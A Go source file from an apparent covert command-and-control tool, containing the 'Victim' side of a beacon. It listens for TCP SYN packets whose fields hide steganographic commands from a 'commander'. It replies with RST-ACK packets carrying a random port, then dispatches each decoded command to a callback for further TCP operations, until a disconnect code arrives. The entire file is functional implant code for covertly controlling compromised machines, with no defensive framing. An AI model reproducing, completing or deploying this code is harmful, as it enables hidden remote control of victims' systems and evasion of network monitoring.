package beacon 

import (
	"fmt"
	"context"
)

type VictimParamsStruct struct{
	Route                   RouteStruct
    ReceiverResponseCh      chan ReceiverOutputStruct
    SenderFeedCh            chan StenoFieldsStruct
    SenderResponseCh        chan SenderOutputStruct
}

func VictimSetup(routeInfo RouteInfoStruct)(VictimParamsStruct, error){
	victimParams := VictimParamsStruct{}
	route, err := parseRoute(routeInfo)
    if err != nil{
        return victimParams, err 
    }
	victimParams.Route              = route
    victimParams.ReceiverResponseCh =  make(chan ReceiverOutputStruct)
    victimParams.SenderFeedCh       =  make(chan StenoFieldsStruct)
    victimParams.SenderResponseCh   =  make(chan SenderOutputStruct)
	go receiver(ReceiverParamsStruct{
        Route: victimParams.Route, 
        PktOutCh: victimParams.ReceiverResponseCh,  
        IsCommander: false,   
    })
    go sender(SenderParamsStruct{
        Route: route, 
        PktInCh: victimParams.SenderFeedCh,
        ResultOutCh: victimParams.SenderResponseCh,   			  
    })
    return victimParams, nil 
}

func Victim(victimParams VictimParamsStruct, callback VictimBeaconCallback){
	ctx, cancel := context.WithCancel(context.Background())
	for receiverResponse := range victimParams.ReceiverResponseCh{ 
		if receiverResponse.IsCriticalErr{
			fmt.Println("receiver critical error", receiverResponse.Err)
			return 
		}
		if receiverResponse.Err != nil{
			fmt.Println("receiver error", receiverResponse.Err)
			continue
		}
		cancel()
		var portNum uint16 
		if val, err := randPort(); err != nil{
			fmt.Println(err)
			return
		} else{
			portNum = val
		}
		beaconRSTACK := BeaconStruct{IsSYN: false, Data: portNum} 
		beaconSYN, err := parseStenoFieldsSYN(&receiverResponse.StenoFields)
		if err != nil{
			fmt.Println("parseStenoFieldsSYN failed ", err)
			fmt.Println("setting beaconRSTACK.Type to CrptdPktCode")
			beaconRSTACK.Type = CrptdPktCode
		} else {
			if err := validateCode(beaconSYN.Type); err != nil{ 
				fmt.Println("validateCode failed: ", err)
				fmt.Println("setting beaconRSTACK.Type to InvalidPktCode")
				beaconRSTACK.Type = InvalidPktCode
			} else {
				beaconRSTACK.Type = beaconSYN.Type
			}
		}
		stenoFieldsRSTACK := MakeStenoFieldsRSTACK(&beaconRSTACK, &receiverResponse.StenoFields) 
		senderOutput := trasmitStenoFields(stenoFieldsRSTACK, 
			victimParams.SenderFeedCh, victimParams.SenderResponseCh)

        if senderOutput.IsCriticalErr{
            fmt.Println("sender critical error", senderOutput.Err)
            return 
        }
        if senderOutput.Err != nil { 
            fmt.Println("sender error:", senderOutput.Err)
            continue
        }
		if beaconRSTACK.Type == CrptdPktCode || beaconRSTACK.Type == InvalidPktCode{
			fmt.Println("code is ", CodeStrToCodeNum[beaconRSTACK.Type], "not going forward to TCP Op")
			continue
		}
		
		fmt.Printf("beaconSYN[Code = %s, Options = %d, Port = %d, IsSYN = %t]\n", 
		CodeStrToCodeNum[beaconSYN.Type], beaconSYN.Options,  beaconSYN.Data, beaconSYN.IsSYN)
	
		fmt.Printf("beaconRSTACK[Code = %s, Options = %d, Port = %d, IsSYN = %t]\n", 
		CodeStrToCodeNum[beaconRSTACK.Type], beaconRSTACK.Options,  beaconRSTACK.Data, 
		beaconRSTACK.IsSYN)
		
		if beaconSYN.Type != DiscCode{
			ctx, cancel = context.WithCancel(context.Background())
			go callback(beaconSYN, beaconRSTACK, victimParams.Route, ctx)
		} else if beaconSYN.Type == DiscCode{
			return 
		}
	}
}




